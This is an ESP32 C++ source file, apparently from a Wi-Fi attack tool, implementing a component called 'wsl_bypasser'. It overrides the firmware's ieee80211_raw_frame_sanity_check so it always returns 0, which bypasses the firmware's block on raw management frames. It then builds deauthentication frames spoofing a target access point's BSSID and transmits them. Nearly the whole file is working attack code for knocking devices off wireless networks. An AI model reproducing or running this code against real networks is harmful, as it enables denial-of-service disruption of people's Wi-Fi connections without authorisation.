#include "components/wsl_bypasser/wsl_bypasser.h"
#include <esp_wifi.h>

void wslbypasser::send_raw_frame(const uint8_t *frame_buffer, int size){
    esp_wifi_80211_tx(WIFI_IF_AP, frame_buffer, size, false);
}


int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3){
    return 0;
}

void wslbypasser::wsl_bypasser_send_deauth_frame(const wifi_ap_record_t *ap_record){
    Serial.println("Sending deauth frame...");
    uint8_t deauth_frame[sizeof(deauth_frame_default)];
    memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
    memcpy(&deauth_frame[10], ap_record->bssid, 6);
    memcpy(&deauth_frame[16], ap_record->bssid, 6);
    
    send_raw_frame(deauth_frame, sizeof(deauth_frame_default));
}
